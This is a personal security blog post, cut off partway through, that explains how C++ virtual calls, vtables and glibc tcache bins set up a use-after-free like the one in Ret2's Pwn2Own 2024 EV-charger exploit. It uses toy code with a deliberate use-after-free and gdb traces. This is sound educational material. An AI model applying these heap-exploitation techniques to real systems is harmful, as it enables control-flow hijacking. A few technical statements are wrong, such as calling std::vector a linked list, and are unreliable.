<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Analyzing C++ Compiler Vulnerabilities | halcyondream</title>
<meta name="generator" content="Jekyll v3.9.3" />
<meta property="og:title" content="Analyzing C++ Compiler Vulnerabilities" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Ret2 did a two-part writeup about a pwn2own 2024 challenge, where they exploited an electrical vehicle charging station: the CHARX SEC-3100. Both the solution and the firmware (which is not encrypted) are available online at this time. The firmware is 32-bit ARM and runs in a Linux environment, and the updates are all squashfs’ed, ready to be flashed or unpacked. Their exploit relied on a use-after-free vulnerability, coupled with some interesting side effects from both the code and the standard library version used." />
<meta property="og:description" content="Ret2 did a two-part writeup about a pwn2own 2024 challenge, where they exploited an electrical vehicle charging station: the CHARX SEC-3100. Both the solution and the firmware (which is not encrypted) are available online at this time. The firmware is 32-bit ARM and runs in a Linux environment, and the updates are all squashfs’ed, ready to be flashed or unpacked. Their exploit relied on a use-after-free vulnerability, coupled with some interesting side effects from both the code and the standard library version used." />
<link rel="canonical" href="http://localhost:4000/2025/09/01/analyzing-cplusplus-compiler-vulnerabilities.html" />
<meta property="og:url" content="http://localhost:4000/2025/09/01/analyzing-cplusplus-compiler-vulnerabilities.html" />
<meta property="og:site_name" content="halcyondream" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2025-09-01T00:00:00-04:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Analyzing C++ Compiler Vulnerabilities" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-09-01T00:00:00-04:00","datePublished":"2025-09-01T00:00:00-04:00","description":"Ret2 did a two-part writeup about a pwn2own 2024 challenge, where they exploited an electrical vehicle charging station: the CHARX SEC-3100. Both the solution and the firmware (which is not encrypted) are available online at this time. The firmware is 32-bit ARM and runs in a Linux environment, and the updates are all squashfs’ed, ready to be flashed or unpacked. Their exploit relied on a use-after-free vulnerability, coupled with some interesting side effects from both the code and the standard library version used.","headline":"Analyzing C++ Compiler Vulnerabilities","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2025/09/01/analyzing-cplusplus-compiler-vulnerabilities.html"},"url":"http://localhost:4000/2025/09/01/analyzing-cplusplus-compiler-vulnerabilities.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="halcyondream" /></head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">halcyondream</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Analyzing C++ Compiler Vulnerabilities</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2025-09-01T00:00:00-04:00" itemprop="datePublished">Sep 1, 2025
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>Ret2 did a <a href="https://blog.ret2.io/2024/07/17/pwn2own-auto-2024-charx-bugs/">two-part writeup about a pwn2own 2024 challenge</a>, where they exploited an electrical vehicle charging station: the CHARX SEC-3100. Both the solution and the <a href="https://www.phoenixcontact.com/en-us/products/ac-charging-controller-charx-sec-3100-1139012#downloads-link-target">firmware (which is not encrypted)</a> are available online at this time. The firmware is 32-bit ARM and runs in a Linux environment, and the updates are all squashfs’ed, ready to be flashed or unpacked. Their exploit relied on a use-after-free vulnerability, coupled with some interesting side effects from both the code and the standard library version used.</p>

<p>To accompany the Pwn2Own writeups, they also provide a <a href="https://wargames.ret2.systems/level/charxpost_destructors">public challenge</a>, which is part of their wargames platform. To demonstrate the use-after-free vulnerability specifically, they <em>also</em> provide some toy code in the first of the two writeups. Both the challenge and the toy code have the same UAF bug, which is triggered by the outer class’ destructor on exit.</p>

<p>I wanted to do a deeper dive into the conditions that lead to exploitation in both the toy code example and the Wargames challenge code. The reader is left to solve the Wargames challenge on their own. The intention here is to walk through some C++ and GCC foundations to understand the problems they introduced and how they work together on the path to exploitation.</p>

<p>In particular, the analysis is broken up into a few different parts, most of which were addressed by the two writeups on the EV challenge:</p>

<ul>
  <li>Understanding the role of <a href="https://en.cppreference.com/w/cpp/language/virtual.html">C++ virtual functions</a> (and how to spot them)</li>
  <li>Tracing what <em>free</em>‘d elements look like in <a href="https://sourceware.org/glibc/wiki/MallocInternals">glibc’s tcache</a></li>
  <li>Seeing how an older glibc standard affects code compilation and execution</li>
  <li>Leveraging the placement of virtual functions in the <a href="https://en.wikipedia.org/wiki/Virtual_method_table">vtable</a></li>
</ul>

<p>Each section contains a quote from the second writeup which explains where my thinking was during exploitation. The intention is to bridge key concepts from the writeup with corresponding behaviors in the Wargames challenge.</p>

<p>This writeup mostly focuses on how the C++ code compiles. Those understandings are really the key to solving the challenge.</p>
<h1 id="virtual-functions">Virtual Functions</h1>

<blockquote>
  <p>Assuming we can control a node along this traversal, we can easily hijack control flow with the virtual call to <code class="language-plaintext highlighter-rouge">get_connection_id</code>.</p>
</blockquote>

<p>Abusing virtual functions to hijack control flow is an interesting side effect of how virtual functions compile.</p>

<p>As a base case, let’s consider the following code:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Item</span> <span class="p">{</span>
<span class="nl">public:</span>
  <span class="kt">void</span> <span class="n">foo</span><span class="p">();</span>
<span class="p">};</span>
</code></pre></div></div>

<p>We will implement every version of <code class="language-plaintext highlighter-rouge">Item::foo</code> with an innocuous definition:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">Item</span><span class="o">::</span><span class="n">foo</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"foo</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Then, call it inside <code class="language-plaintext highlighter-rouge">main</code>:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">Item</span> <span class="n">item</span><span class="p">;</span>
  <span class="n">item</span><span class="p">.</span><span class="n">foo</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>We can compile it with debugging flags for clarity:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -g demo.cpp -o demo
</code></pre></div></div>

<p>Then disassemble <code class="language-plaintext highlighter-rouge">main</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) set print asm-demangle on

(gdb) disas main
Dump of assembler code for function main():
   0x000000000000113a &lt;+0&gt;:     push   rbp
   0x000000000000113b &lt;+1&gt;:     mov    rbp,rsp
   0x000000000000113e &lt;+4&gt;:     sub    rsp,0x10
   0x0000000000001142 &lt;+8&gt;:     lea    rax,[rbp-0x1]
   0x0000000000001146 &lt;+12&gt;:    mov    rdi,rax
   0x0000000000001149 &lt;+15&gt;:    call   0x1156 &lt;Item::foo()&gt;
   0x000000000000114e &lt;+20&gt;:    mov    eax,0x0
   0x0000000000001153 &lt;+25&gt;:    leave
   0x0000000000001154 &lt;+26&gt;:    ret
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">Item::foo</code> compiles to its own function. Even if you compile it without the label, the invocation still calls a fixed offset.</p>

<p>Now, let’s only modify the <code class="language-plaintext highlighter-rouge">Item</code> class to make <code class="language-plaintext highlighter-rouge">foo</code> virtual:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class Item {
public:
  virtual void foo();
};
</code></pre></div></div>

<p>We can compile with debugging flags again and disassemble main:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) disas main
Dump of assembler code for function main():
   &lt;+0&gt;:     push   rbp
   &lt;+1&gt;:     mov    rbp,rsp
   &lt;+4&gt;:     sub    rsp,0x10
   &lt;+8&gt;:     lea    rax,[rip+0x2c6f]  # 0x3db8 &lt;vtable for Item+16&gt;
   &lt;+15&gt;:    mov    QWORD PTR [rbp-0x8],rax
   &lt;+19&gt;:    lea    rax,[rbp-0x8]
   &lt;+23&gt;:    mov    rdi,rax
   &lt;+26&gt;:    call   0x1160 &lt;Item::foo()&gt;
   &lt;+31&gt;:    mov    eax,0x0
   &lt;+36&gt;:    leave
   &lt;+37&gt;:    ret
</code></pre></div></div>

<p>Here, too, it compiles to a function at some fixed offset.</p>

<p>Recall that in <code class="language-plaintext highlighter-rouge">main</code>, we use an instance of <code class="language-plaintext highlighter-rouge">Item</code>. Let’s refactor it to use a pointer instead:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int main() {
  Item *item_ptr = new Item{};
  item_ptr-&gt;foo();
}
</code></pre></div></div>

<p>Notice how the invocation changes:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dump of assembler code for function main():
   0x000000000000115a &lt;+0&gt;:     push   rbp
   0x000000000000115b &lt;+1&gt;:     mov    rbp,rsp
   0x000000000000115e &lt;+4&gt;:     push   rbx
   0x000000000000115f &lt;+5&gt;:     sub    rsp,0x18
   0x0000000000001163 &lt;+9&gt;:     mov    edi,0x8
   0x0000000000001168 &lt;+14&gt;:    call   0x1030 &lt;operator new(unsigned long)@plt&gt;
   0x000000000000116d &lt;+19&gt;:    mov    rbx,rax
   0x0000000000001170 &lt;+22&gt;:    mov    QWORD PTR [rbx],0x0
   0x0000000000001177 &lt;+29&gt;:    mov    rdi,rbx
   0x000000000000117a &lt;+32&gt;:    call   0x11d6 &lt;Item::Item()&gt;
   0x000000000000117f &lt;+37&gt;:    mov    eax,0x0
   0x0000000000001184 &lt;+42&gt;:    mov    QWORD PTR [rbp-0x18],rbx
   0x0000000000001188 &lt;+46&gt;:    test   al,al
   0x000000000000118a &lt;+48&gt;:    je     0x1199 &lt;main()+63&gt;
   0x000000000000118c &lt;+50&gt;:    mov    esi,0x8
   0x0000000000001191 &lt;+55&gt;:    mov    rdi,rbx
   0x0000000000001194 &lt;+58&gt;:    call   0x1040 
   0x0000000000001199 &lt;+63&gt;:    mov    rax,QWORD PTR [rbp-0x18]
   0x000000000000119d &lt;+67&gt;:    mov    rax,QWORD PTR [rax]
   0x00000000000011a0 &lt;+70&gt;:    mov    rdx,QWORD PTR [rax]
   0x00000000000011a3 &lt;+73&gt;:    mov    rax,QWORD PTR [rbp-0x18]
   0x00000000000011a7 &lt;+77&gt;:    mov    rdi,rax
   0x00000000000011aa &lt;+80&gt;:    call   rdx
   0x00000000000011ac &lt;+82&gt;:    mov    eax,0x0
   0x00000000000011b1 &lt;+87&gt;:    mov    rbx,QWORD PTR [rbp-0x8]
   0x00000000000011b5 &lt;+91&gt;:    leave
   0x00000000000011b6 &lt;+92&gt;:    ret
</code></pre></div></div>

<p>The actual function call is at <code class="language-plaintext highlighter-rouge">main+80</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) b *main+80
(gdb) r

Breakpoint 1, in main () 

(gdb) x/i $pc
=&gt; 0x5555555551aa &lt;main()+80&gt;:  call   rdx
(gdb) ni

foo
</code></pre></div></div>

<p>So, the virtual function is set up with this chunk of instructions, and invoked with the call to RDX:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   0x0000000000001199 &lt;+63&gt;:    mov    rax,QWORD PTR [rbp-0x18]
   0x000000000000119d &lt;+67&gt;:    mov    rax,QWORD PTR [rax]
   0x00000000000011a0 &lt;+70&gt;:    mov    rdx,QWORD PTR [rax]
   0x00000000000011a3 &lt;+73&gt;:    mov    rax,QWORD PTR [rbp-0x18]
   0x00000000000011a7 &lt;+77&gt;:    mov    rdi,rax
   0x00000000000011aa &lt;+80&gt;:    call   rdx
</code></pre></div></div>

<p>This is conceptually similar to the way function pointers work in standard C. Observe the call to <code class="language-plaintext highlighter-rouge">fptr</code> is also a call to a register, RDX:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat fptr.c
#include &lt;stdio.h&gt;

void do_something() {
  printf("Hello\n");
}

int main() {
  void (*fptr)() = 0;
  fptr = &amp;do_something;
  fptr();
}

$ objdump --disassemble=main -Mintel fptr
...
&lt;main&gt;:
push   rbp
mov    rbp,rsp
sub    rsp,0x10
mov    QWORD PTR [rbp-0x8],0x0
lea    rax,[rip+...]  # &lt;do_something&gt;
mov    QWORD PTR [rbp-0x8],rax
mov    rdx,QWORD PTR [rbp-0x8]
mov    eax,0x0
call   rdx
mov    eax,0x0
leave
ret
</code></pre></div></div>

<p>A major difference, however, is what’s happening behind the scenes. Every virtual function defined in a class will compile a “vtable,” which is a buffer of memory containing offsets to each virtual function. We can illustrate what the vtable dereference chain by annotating the disassembly:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov    rax, [...]  // *item
mov    rax, [rax]  // item-&gt;vtable
mov    rdx, [rax]  // item-&gt;vtable-&gt;foo
...
call   rdx         // call item-&gt;vtable-&gt;foo()
</code></pre></div></div>

<p>An interesting property of vtables is that, because it pulls a function at some offset, adding more virtual functions will usually compile at different offsets, and usually in order (although that’s not always a guarantee). Let’s check this out:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>class Item {
public:
  virtual void bar();
  virtual void foo();
};
</code></pre></div></div>

<p>You can define <code class="language-plaintext highlighter-rouge">bar</code> however you want, but we won’t be using it. Compile the code and disassemble it again. Note the change to the virtual call instructions:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov    rax,QWORD PTR [rbp-0x18]
mov    rax,QWORD PTR [rax]
add    rax,0x8
mov    rdx,QWORD PTR [rax]
...
call   rdx
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">ADD RAX,0x8</code> instruction queries the vtable a little differently:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>item-&gt;(vtable+0x8)-&gt;foo()
</code></pre></div></div>

<p>The address of <code class="language-plaintext highlighter-rouge">Item::foo</code> exists at offset <code class="language-plaintext highlighter-rouge">0x8</code> in the Item pointer’s vtable.</p>

<h1 id="glibcs-tcache">Glibc’s tcache</h1>

<blockquote>
  <p>Fully understanding glibc tcache internals isn’t necessary here; it suffices to say that a tcache bin is just a singly-linked list of free chunks of the same size, where the next pointer is placed at offset 0 in the free chunk.</p>
</blockquote>

<p>The tcache is a glibc internal mechanism that can be abused in applications using dynamic memory allocation. Over the years, it’s served as the object of a few different exploit classes involving dynamic allocation. This walkthrough will show you how to navigate a use-after-free (UAF) bug which involves a tcache entry and a free’d <code class="language-plaintext highlighter-rouge">std::vector</code>.</p>

<p>The tcache was introduced in glibc 2.26 back in 2017. It still plays a major role in the glibc memory allocator today. There is a <a href="https://www.youtube.com/watch?v=0jHtqqdVv1Y">great video on tcache behavior</a> and a <a href="https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/implementation/tcache/">good walkthrough on the source code</a>. We’ll cover some basics and really focus on how they apply to the <code class="language-plaintext highlighter-rouge">std::vector</code> type.</p>

<p>Let’s start by exploring the tcache entry. In glibc, a <code class="language-plaintext highlighter-rouge">tcache_entry</code> is both a struct and a typedef of that struct:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span>
<span class="k">struct</span> <span class="n">tcache_entry</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">tcache_perthread_struct</span> <span class="o">*</span><span class="n">key</span><span class="p">;</span>  <span class="c1">// Avoids double-frees.</span>
<span class="p">}</span>
<span class="n">tcache_entry</span><span class="p">;</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">std::vector</code> type is a C++ linked-list which can store arbitrary data types. Under the hood, it involves some dynamic memory allocations. It is the object of a free Ret2 Wargame challenge and is also the focus of discussion here.</p>

<p>Let’s start with some driver code.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;inttypes.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;vector&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">uint64_t</span><span class="o">&gt;</span> <span class="n">v</span><span class="p">;</span>
  <span class="n">v</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
  <span class="n">v</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="mi">5</span><span class="p">);</span>
  <span class="n">v</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="mi">9</span><span class="p">);</span>
  <span class="n">v</span><span class="p">.</span><span class="n">push_back</span><span class="p">(</span><span class="mi">13</span><span class="p">);</span>

  <span class="c1">// Print the contents.</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"0x%llu 0x%llu 0x%llu 0x%llu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>

  <span class="c1">// Explicitly destroy the vector.</span>
  <span class="n">v</span><span class="p">.</span><span class="o">~</span><span class="n">vector</span><span class="p">();</span>

  <span class="c1">// Intentionally do a use-after free.</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"0x%llu 0x%llu 0x%llu 0x%llu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This code prints the following:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x3 0x5 0x9 0x13
0x188703 0x5337669691617803236 0x9 0x13
free(): double free detected in tcache 2
</code></pre></div></div>

<p>The first row is what we, the developer, expected. The second row is the consequence of using the vector after a <em>free</em> operation. There’s two important dimensions here:</p>

<ul>
  <li>The elements at <code class="language-plaintext highlighter-rouge">v[0]</code> and <code class="language-plaintext highlighter-rouge">v[1]</code> represent data from a tcache entry</li>
  <li>The “double free” error implies that deleting a vector involves some dynamic memory allocation and deallocation</li>
</ul>

<p>At the crash site, <code class="language-plaintext highlighter-rouge">*next</code> is a pointer to <code class="language-plaintext highlighter-rouge">0x188703</code> and the <code class="language-plaintext highlighter-rouge">*key</code> is <code class="language-plaintext highlighter-rouge">0x5337669691617803236</code>. Tcache entries exist only after you have <em>free</em>‘d some allocated memory. In C++, this can include destructors, the <code class="language-plaintext highlighter-rouge">delete</code> operator, and classic calls to the <code class="language-plaintext highlighter-rouge">free</code> standard library function.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  struct tcache_entry *next: 0x188703
  struct tcache_perthread_struct *key: 0x5337669691617803236
</code></pre></div></div>

<p>Tcache entries are linked lists of <em>free</em>‘d items of the same “bin” size. Bin sizes are usually powers of two: 8, 16, 32, 64. The logic that defines each bin size is defined in <code class="language-plaintext highlighter-rouge">malloc.c</code>, and like many things in glibc, its true definition is shrouded in macros.</p>

<p>Developers can use the output of the <code class="language-plaintext highlighter-rouge">malloc_usable_size</code> function to help determine which bin an allocation will be <em>free</em>‘d to. Otherwise, you’re left to the debugger, but that’s sometimes all you really need.</p>

<p>In this example, the value of <code class="language-plaintext highlighter-rouge">*next</code> (0x188703) is not an address and will not dereference to anything. This is expected because only one object of that bin’s size has been <em>free</em>‘d. If there were another object of an equivalent size <em>free</em>‘d before the vector, <code class="language-plaintext highlighter-rouge">*next</code> would point to it.</p>

<p>So, to facilitate control over the tcache, we need to free something else, something <em>other than the vector</em>, but of its same size.</p>

<p>Let’s do try that now.</p>

<h1 id="finding-allocation-sizes-for-tcache-bins">Finding allocation sizes for tcache bins</h1>

<blockquote>
  <p>When this node is freed during the list destructor, the chunk will have a size class of <code class="language-plaintext highlighter-rouge">0x68</code>, and will be placed into the <a href="https://ir0nstone.gitbook.io/notes/types/heap/the-tcache">tcache</a> bin of that size</p>
</blockquote>

<p>Here, we want to consider what size a chunk will be by the time a vector is <em>free</em>‘d.</p>

<p>If you <a href="https://github.com/gcc-mirror/gcc/blob/master/libstdc%2B%2B-v3/include/bits/stl_vector.h">read the source code for a vector</a>, you’ll notice that the vector class template actually extends the <code class="language-plaintext highlighter-rouge">_Vector_base</code> structure. You’ll also notice a <code class="language-plaintext highlighter-rouge">_Vector_impl _M_impl</code> field, which is the first field defined in this, and has a couple of allocation and deallocation methods near it. This <code class="language-plaintext highlighter-rouge">_M_impl</code> structure is the backend of the vector type and is a major data structure responsible for many of its dynamic behaviors.</p>

<p>The first field in this structure represents the first item in the vector. In fact, when you view the address of a vector, this structure field is the address you get back.</p>

<p>When the vector’s own destructor is called, it calls the destructor of <code class="language-plaintext highlighter-rouge">~Vector_base</code> last. Here’s the pared-down destructor definition for clarity:</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">~</span><span class="n">_Vector_base</span> <span class="p">()</span>
<span class="p">{</span>
  <span class="kt">ptrdiff_t</span> <span class="n">__n</span> <span class="o">=</span> <span class="n">_M_impl</span><span class="p">.</span><span class="n">_M_end_of_storage</span> <span class="o">-</span> <span class="n">_M_impl</span><span class="p">.</span><span class="n">_M_start</span><span class="p">;</span>
  <span class="n">_M_deallocate</span> <span class="p">(</span><span class="n">_M_impl</span><span class="p">.</span><span class="n">_M_start</span><span class="p">,</span> <span class="kt">size_t</span> <span class="p">(</span><span class="n">__n</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<p>The <code class="language-plaintext highlighter-rouge">_M_deallocate</code> function has  a call path that leads to <code class="language-plaintext highlighter-rouge">free</code>. It’s easier to appreciate in the debugger.</p>

<p>We can break at the call to the vector’s destructor in <em>main</em>, inspect the argument given, and then break on free. If we do one step, we land at the invocation of <em>free</em>, where we find that the vector’s address is being <em>free</em>‘d: that is, the <code class="language-plaintext highlighter-rouge">_M_impl</code> structure, which is allocated at <code class="language-plaintext highlighter-rouge">0x6ee800</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Breakpoint 6, in main

(gdb) x/i $pc
=&gt; &lt;main()+376&gt;: call  std::vector&lt;&gt;::~vector

(gdb) x/gx $rdi
0x7fffffffe150: 0x000055555556b2f0

(gdb) b *free
(gdb) c

Breakpoint 7, __GI___libc_free 

(gdb) bt
#0  __GI___libc_free 
#1  std::__new_allocator&lt;&gt;::deallocate 
#2  std::allocator_traits&lt;&gt;::deallocate 
#3  gned long, std::allocator&lt;&gt;::_M_deallocate 
#4  std::_Vector_base&lt;unsigned long, std::allocator&lt;&gt;::~_Vector_base 
#5  std::vector&lt;unsigned long, std::allocator&lt;&gt;::~vector 
#6  main 

(gdb) print/x $rdi
$8 = 0x55555556b2f0
</code></pre></div></div>

<p>Continue execution. Notice <em>free</em> is called only one time. So, the size of the data pointed to by <code class="language-plaintext highlighter-rouge">_M_start</code> is our culprit for tcache binning.</p>

<p>If we can find the size of the <code class="language-plaintext highlighter-rouge">_M_impl</code> structure, we can get an idea of what sized allocations will end up in its tcache bin and, thus, link to its <code class="language-plaintext highlighter-rouge">next</code> pointer. To get this idea for size, we can apply the reverse logic as before and track where the vector operation allocates memory.</p>

<p>First, let’s acknowledge that the internal structure is initialized only after the vector is given some elements. We can observe this by tracking the memory from the vector’s creation until the first call to <code class="language-plaintext highlighter-rouge">push_back</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
// The vector's internal structure is initialized to null.
(gdb) x/i $pc
=&gt; main+20:  call  std::vector&lt;&gt;::vector
(gdb) x/gx $rdi
0x7fffffffe150: 0x00000000000011ff
(gdb) ni
(gdb) x/gx $rdi
0x7fffffffe150: 0x0000000000000000

(gdb) c
Continuing.

// The structure after the first call to vector::push_back.
Breakpoint 2 in main
(gdb) x/i $pc
=&gt; main+47:  call  std::vector&lt;&gt;::push_back
(gdb) x/gx $rdi
0x7fffffffe150: 0x0000000000000000
(gdb) ni
(gdb) x/gx $rdi
0x7fffffffe0b0: 0x000055555556b2b0
</code></pre></div></div>

<p>We can then set a breakpoint on <code class="language-plaintext highlighter-rouge">malloc</code> and continue execution to see the call path:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Breakpoint 1, main () at demo.cpp:6

(gdb) b *malloc
(gdb) c

Breakpoint 2, __GI___libc_malloc (bytes=8) at ./malloc/malloc.c:3301

(gdb) bt
#0  malloc
#1  operator new
#2  std::__new_allocator&lt;&gt;::allocate
#3  std::allocator_traits&lt;&gt;::allocate
#4  std::_Vector_base&lt;&gt;::_M_allocate
#5  std::vector&lt;&gt;::_M_realloc_append&lt;&gt;
#6  std::vector&lt;&gt;::emplace_back&lt;&gt;
#7  std::vector&lt;&gt;::push_back
#8  main
(gdb) print/x $rdi
$1 = 0x8
</code></pre></div></div>

<p>We can see the call path to <code class="language-plaintext highlighter-rouge">push_back</code> leads to the allocation. Because <code class="language-plaintext highlighter-rouge">malloc</code> accepts one argument, a <em>size_t</em>, we can see the initial allocation size by printing its argument:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(gdb) print/x $rdi
$1 = 0x8
</code></pre></div></div>

<p>Indeed, integers in x64 are four bytes, so this matches our expectations.</p>

<p>Now, recall that each invocation of <code class="language-plaintext highlighter-rouge">push_back</code> will actually call <code class="language-plaintext highlighter-rouge">malloc</code>. This has some interesting implications.</p>

<p>To appreciate this, we will augment the non-pointer vector example to use a function called <code class="language-plaintext highlighter-rouge">malloc_usable_size</code>, which is the target value we need in order to exploit the main code. I intentionally leave out any initial calls to <code class="language-plaintext highlighter-rouge">push_back</code> so we can observe the output.</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;vector&gt;
#include &lt;stdlib.h&gt;
#include &lt;malloc.h&gt;
#include &lt;stdio.h&gt;
</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span> <span class="n">v</span><span class="p">;</span>
    <span class="k">auto</span> <span class="n">v_data</span> <span class="o">=</span> <span class="n">v</span><span class="p">.</span><span class="n">data</span><span class="p">();</span>
    <span class="k">auto</span> <span class="n">v_cast</span> <span class="o">=</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">void</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">v_data</span><span class="p">);</span>
    <span class="k">auto</span> <span class="n">v_usable</span> <span class="o">=</span> <span class="n">malloc_usable_size</span><span class="p">(</span><span class="n">v_cast</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Vector backing usable: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">v_usable</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>This prints:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Vector backing usable: 0x0
</code></pre></div></div>

<p>This makes sense because we haven’t actually initialized the vector’s internal structure with memory. If we add one invocation of <code class="language-plaintext highlighter-rouge">v.push_back(x)</code>, we get <code class="language-plaintext highlighter-rouge">0x8</code> (8 bytes). After four invocations, we get <code class="language-plaintext highlighter-rouge">0x40</code> (64 bytes), and so on.</p>

<p>Observe some other interesting behaviors:</p>
<ul>
  <li>If you break on each execution of malloc, and inspect the argument at RDI, you can see the size of the vector’s internal data structure increase by 4, 8, 16, and 32, respectively.</li>
  <li>Likewise, if you run something like <code class="language-plaintext highlighter-rouge">v.erase(v.begin())</code>, the size of the internal structure will <em>not</em> go down or reduce.</li>
